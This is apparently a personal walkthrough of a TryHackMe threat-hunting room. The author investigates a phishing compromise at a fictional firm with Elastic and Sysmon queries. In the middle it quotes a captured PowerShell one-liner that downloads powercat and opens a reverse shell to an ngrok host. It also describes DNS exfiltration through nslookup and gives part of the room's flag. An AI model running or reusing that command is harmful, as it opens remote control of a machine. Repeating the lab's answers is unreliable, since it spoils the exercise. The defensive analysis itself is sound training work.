---
parent: "[[CTFs - THM]]"
resources:
---
On **Friday, September 15, 2023**, Michael Ascot, a Senior Finance Director from SwiftSpend, was checking his emails in **Outlook** and came across an email appearing to be from Abotech Waste Management regarding a monthly invoice for their services. Michael actioned this email and downloaded the attachment to his workstation without thinking.

![The email that Michael received](https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/1324483d59e28d04fbc0ec5579da6c90.png)  

The following week, Michael received another email from his contact at Abotech claiming they were recently hacked and to carefully review any attachments sent by their employees. However, the damage has already been done. Use the attached Elastic instance to hunt for malicious activity on Michael's workstation and within the SwiftSpend domain!

---

### What was the name of the ZIP attachment that Michael downloaded?

- Filtering by `event.code:15` (which is Sysmon event ID for file [FileCreateStreamHash](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventid=90015)) we get two results.

- I also used `file.name` and `file.directory` as columns to filter the relevant information.

![[Pasted image 20241003162401.png]]

### What was the contained file that Michael extracted from the attachment?  

- The response can be found by following the steps above.

### What was the name of the command-line process that spawned from the extracted file attachment?  

- Starting with the query above, I decided to see what's the host name of the compromised device. Then, I filtered using the query below

```
event.code : 1 and host.name : "wkstn-01"
```

- Considering the attachment was downloaded at `18:41:11`, I discarded all results that occured earlier than this.
- The first process after this timestamp was `powershell.exe` which indeed was malicious, once we took a look at the entire command line

```
OriginalFileName: PowerShell.EXE CommandLine: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell"
```

![[Pasted image 20241003163421.png]]

### What URL did the attacker use to download a tool to establish a reverse shell connection?  

- Answered above.

### What port did the workstation connect to the attacker on?  

- Also answered above.

### What was the first native Windows binary the attacker ran for system enumeration after obtaining remote access?  

- Using the same query as above

```
event.code : 1 and host.name : "wkstn-01"
```

- Look through the results having them ordered by timestamp.

### What is the URL of the script that the attacker downloads to enumerate the domain?  

- Since we know it's a script, I decided to look through all the PS1 results. 
- However, I have filtered to exclude everything containing `powercat`. 
- Looking through the logs, I found out that `powerview` was downloaded on the station.

![[Pasted image 20241004104125.png]]

- Searching after ps1 and event.code 800 (Pipeline Execution Details) and checking the earlierst entry, we find out the command executed to dowload the tool and the URL.

![[Pasted image 20241004104422.png]]

### What was the name of the file share that the attacker mapped to Michael's workstation?  

```
process.name : net.exe
```

- Net.exe can be used to map network shares - considering this, we found the following

![[Pasted image 20241004110231.png]]

### What directory did the attacker copy the contents of the file share to?  

- I took the next question as a hint. Since we knew that we must find an excel file, I filtered by 

```
*xlsx
```

![[Pasted image 20241004105208.png]]


### What was the name of the Excel file the attacker extracted from the file share?  

- Can be also answered using the query above.
- Also can be found by using

```
event.code: 11 and file.name: *xlsx
```


### What was the name of the archive file that the attacker created to prepare for exfiltration?  

![[Pasted image 20241004105145.png]]

- Tale a look at all the file names.

### What is the **MITRE ID** of the technique that the attacker used to exfiltrate the data?  

- take a look [here](https://attack.mitre.org/tactics/TA0010/) at T1048 

### What was the domain of the attacker's server that retrieved the exfiltrated data?  

```
process.working_directory : *exfiltration
```

![[Pasted image 20241004111342.png]]

- Since we knew what and from where was exfiltrated, I decided to see what processes accessed that path.

### The attacker exfiltrated an additional file from the victim's workstation. What is the flag you receive after reconstructing the file?

```
process.name: nslookup.exe and event.code: 1
```

- Decided to filter after the tool itself, since we dont know if the same path was used.

![[Pasted image 20241004111858.png]]

- Most of the results were the same as before, excepting the first two.

- If we decode the base64, we see that `VEhNezE0OTczMjFmNGY2ZjA1OWE1Mm` results into `THM{1497321f4f6f059a52`

- The entry above, starting with `RmY` is the 2nd partof the flag. concatenate these two to get it.

